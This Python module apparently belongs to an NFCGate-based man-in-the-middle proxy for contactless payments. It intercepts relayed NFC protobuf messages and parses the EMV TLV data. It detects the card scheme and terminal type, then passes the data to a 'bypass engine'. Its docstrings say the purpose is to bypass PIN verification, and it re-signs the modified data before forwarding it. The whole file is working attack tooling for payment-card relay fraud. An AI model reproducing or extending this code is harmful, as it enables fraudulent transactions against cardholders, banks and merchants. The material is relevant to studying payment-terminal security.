"""
NFC data handler integrating all components.
Prefers real protobufs from nfcgate_pb2 when available, falls back to shims.
"""
import traceback
from binascii import hexlify
from typing import Dict, Any, Optional

try:
    # Prefer real generated protobufs if present
    from nfcgate_pb2 import NFCData as _RealNFCData, Wrapper as _RealWrapper
    USING_REAL_PROTO = True
except Exception:
    _RealNFCData = None
    _RealWrapper = None
    USING_REAL_PROTO = False

if USING_REAL_PROTO:
    NFCData = _RealNFCData  # type: ignore
    Wrapper = _RealWrapper  # type: ignore
else:
    # Fallback to local shims
    from .c2c_pb2 import NFCData
    from .metaMessage_pb2 import Wrapper

from ..core.tlv_parser import parse_tlv, build_tlv, is_valid_tlv
from ..core.crypto_handler import sign_data, add_signature_to_tlvs, load_or_generate_private_key
from ..core.payment_detector import get_scheme_from_tlvs, detect_terminal_type
from ..mitm.bypass_engine import bypass_tlv_modifications
from ..utils.logger import Logger

logger = Logger("NFCHandler")


def handle_nfc_data(data: bytes, private_key, state: Dict[str, Any]) -> bytes:
    """
    Process NFC data, bypass PIN verification for valid TLVs, and sign.
    
    Args:
        data: Raw NFC data bytes
        private_key: RSA private key for signing
        state: Current MITM state
        
    Returns:
        Modified NFC data bytes
    """
    try:
        # Set default state values
        state.setdefault('cdcvm_enabled', True)
        
        # Parse NFCData protobuf
        nfc = NFCData()
        nfc.ParseFromString(data)
        raw_data = nfc.data
        
        logger.info(f"Original NFC data: {hexlify(raw_data).decode()}")

        # Check if data is valid TLV
        if not is_valid_tlv(raw_data):
            logger.info("Data is not a valid TLV structure, returning unchanged")
            return data

        # Parse TLV data
        tlvs = parse_tlv(raw_data)
        
        # Detect payment scheme and terminal type
        scheme = get_scheme_from_tlvs(tlvs)
        terminal_type = detect_terminal_type(tlvs)
        
        logger.info(f"Scheme detected: {scheme}")
        logger.info(f"Terminal type detected: {terminal_type}")

        # Apply MITM modifications
        modified_tlvs = bypass_tlv_modifications(tlvs, scheme, terminal_type, state)
        
        if modified_tlvs is None:
            logger.info("Blocked all communication due to block_all setting, returning original data")
            return data

        # Build unsigned data
        unsigned_data = build_tlv(modified_tlvs)
        
        # Ensure we have a private key; load/generate default if missing
        key = private_key
        if key is None:
            try:
                key = load_or_generate_private_key('keys/private.pem')
            except Exception:
                key = None

        # Sign the data (only if key available)
        signature = sign_data(unsigned_data, key) if key is not None else b''
        
        # Add signature to TLVs
        signed_tlvs = add_signature_to_tlvs(modified_tlvs, signature) if signature else modified_tlvs

        # Build final modified data
        modified_data = build_tlv(signed_tlvs)
        
        # Update NFCData with modified content
        nfc.data = modified_data
        result = nfc.SerializeToString()

        logger.info(f"Modified NFC data with PIN bypass and signature: {hexlify(result).decode()}")
        return result

    except ValueError as e:
        logger.error(f"Invalid TLV data: {e}, returning original data")
        return data
    except Exception as e:
        logger.error(f"Error in handle_nfc_data: {e}, returning original data")
        # Log full traceback to file
        try:
            with open('logs/nfcgate_proxy.log', 'a', encoding='utf-8') as f:
                traceback.print_exc(file=f)
        except:
            pass
        return data


def process_wrapper_message(wrapper_data: bytes, private_key, state: Dict[str, Any]) -> Optional[bytes]:
    """
    Process a Wrapper protobuf message containing NFC data.
    
    Args:
        wrapper_data: Wrapper protobuf bytes
        private_key: RSA private key for signing
        state: Current MITM state
        
    Returns:
        Modified wrapper data or None if no NFCData found
    """
    try:
        wrapper = Wrapper()
        wrapper.ParseFromString(wrapper_data)
        
        logger.debug("Parsed Wrapper message successfully")
        
        has_nfc_oneof = False
        if hasattr(wrapper, 'HasField') and (wrapper.HasField('nfc_data') or wrapper.HasField('NFCData')):
            has_nfc_oneof = True
        elif hasattr(wrapper, 'nfc_data') and getattr(wrapper.nfc_data, 'data', None) not in (None, b''):
            has_nfc_oneof = True

        if has_nfc_oneof:
            # Preview NFC data (handles real or shim)
            try:
                nfc_bytes = getattr(getattr(wrapper, 'nfc_data', None) or wrapper.NFCData, 'data', b'')
                logger.info(f"Wrapper contains NFCData: {hexlify(nfc_bytes).decode()[:100]}...")
            except Exception:
                logger.info("Wrapper contains NFCData")
            
            # Process the NFC data
            # Serialize the active NFCData (works for real or shim)
            modified_nfc_data = handle_nfc_data((getattr(wrapper, 'nfc_data', None) or wrapper.NFCData).SerializeToString(), private_key, state)
            
            # Create response wrapper
            response_wrapper = Wrapper()
            response_nfc = NFCData()
            response_nfc.ParseFromString(modified_nfc_data)
            # Set oneof appropriately based on real vs shim
            if USING_REAL_PROTO:
                # Real field name is snake_case
                response_wrapper.nfc_data.CopyFrom(response_nfc)
            else:
                # Shim exposes PascalCase proxy
                response_wrapper.NFCData.CopyFrom(response_nfc)
            
            result = response_wrapper.SerializeToString()
            ret_preview = getattr(getattr(response_wrapper, 'nfc_data', None) or response_wrapper.NFCData, 'data', b'')
            logger.info(f"Returning modified NFC data: {hexlify(ret_preview).decode()[:100]}...")
            
            return result
        else:
            field = wrapper.WhichOneof('message')
            logger.info(f"No NFCData in Wrapper, found field: {field}")
            
            if (hasattr(wrapper, 'HasField') and (wrapper.HasField('anticol') or wrapper.HasField('Anticol'))):
                logger.info(f"Anticol data: {hexlify(wrapper.Anticol.uid).decode()}")
            elif (hasattr(wrapper, 'HasField') and (wrapper.HasField('status') or wrapper.HasField('Status'))):
                logger.info(f"Status: code={wrapper.Status.code}, message={wrapper.Status.message}")
            elif (hasattr(wrapper, 'HasField') and (wrapper.HasField('data') or wrapper.HasField('Data'))):
                logger.info(f"Data: payload={hexlify(getattr(wrapper.Data, 'payload', getattr(getattr(wrapper, 'data', None) or wrapper.Data, 'blob', b''))).decode()[:100]}...")
                # Try to parse inner wrapper
                inner = getattr(wrapper.Data, 'payload', None)
                if inner is None and hasattr(wrapper, 'data'):
                    inner = getattr(wrapper.data, 'blob', None)
                return process_inner_wrapper(inner or b'', private_key, state)
            elif hasattr(wrapper, 'HasField') and (wrapper.HasField('session') or wrapper.HasField('Session')):
                logger.info(f"Session: id={getattr(wrapper.Session, 'session_id', '')}, status={getattr(wrapper.Session, 'status', '')}")
            
            return None

    except Exception as e:
        logger.error(f"Failed to process Wrapper: {e}")
        traceback.print_exc()
        return None


def process_inner_wrapper(payload: bytes, private_key, state: Dict[str, Any]) -> Optional[bytes]:
    """
    Process inner wrapper data that might contain NFCData.
    
    Args:
        payload: Inner wrapper payload bytes
        private_key: RSA private key for signing
        state: Current MITM state
        
    Returns:
        Modified wrapper data or None if no NFCData found
    """
    try:
        inner_wrapper = Wrapper()
        inner_wrapper.ParseFromString(payload)
        
        logger.debug("Parsed inner Wrapper from Data message")
        
        if inner_wrapper.HasField('NFCData'):
            logger.info(f"Inner Wrapper contains NFCData: {hexlify(inner_wrapper.NFCData.data).decode()[:100]}...")
            
            # Process the inner NFC data
            modified_data = handle_nfc_data(inner_wrapper.NFCData.SerializeToString(), private_key, state)
            
            # Create response
            response_inner_wrapper = Wrapper()
            response_nfc = NFCData()
            response_nfc.ParseFromString(modified_data)
            response_inner_wrapper.NFCData.CopyFrom(response_nfc)
            
            # Wrap in outer Data message (proxy maps payload->blob)
            response_data = Wrapper()
            response_data.Data.payload = response_inner_wrapper.SerializeToString()
            
            result = response_data.SerializeToString()
            logger.info(f"Returning modified NFC data from inner Wrapper: {hexlify(response_inner_wrapper.NFCData.data).decode()[:100]}...")
            
            return result
        else:
            inner_field = inner_wrapper.WhichOneof('message')
            logger.info(f"No NFCData in inner Wrapper, found field: {inner_field}")
            return None
            
    except Exception as e:
        logger.error(f"Failed to parse inner Wrapper: {e}")
        return None
